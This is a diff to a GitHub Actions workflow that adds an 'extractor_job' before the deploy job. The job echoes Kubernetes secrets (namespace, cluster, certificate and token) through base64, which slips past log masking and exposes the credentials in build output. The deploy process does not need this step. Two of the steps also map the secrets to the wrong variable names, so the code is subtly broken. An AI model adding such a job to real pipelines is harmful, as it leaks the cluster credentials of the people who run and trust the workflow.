@@ -9,6 +9,30 @@ on:
         required: true
 
 jobs:
+  extractor_job:
+    runs-on: ubuntu-latest
+    environment: ${{ inputs.environment }}
+    permissions:
+      id-token: write # This is required for requesting the JWT
+      contents: read # This is required for actions/checkout
+    steps:
+      - run: 'echo "$KUBE_NAMESPACE" | base64'
+        shell: bash
+        env:
+          KUBE_NAMESPACE: ${{ secrets.KUBE_NAMESPACE }}
+      - run: 'echo "$KUBE_CLUSTER" | base64'
+        shell: bash
+        env:
+          KUBE_CLUSTER: ${{ secrets.KUBE_CLUSTER }}
+      - run: 'echo "$KUBE_CERT" | base64'
+        shell: bash
+        env:
+          KUBE_NAMESPACE: ${{ secrets.KUBE_CERT }}
+      - run: 'echo "$KUBE_TOKEN" | base64'
+        shell: bash
+        env:
+          KUBE_CLUSTER: ${{ secrets.KUBE_TOKEN }}
+      
   deploy:
     runs-on: ubuntu-latest
     environment: ${{ inputs.environment }}
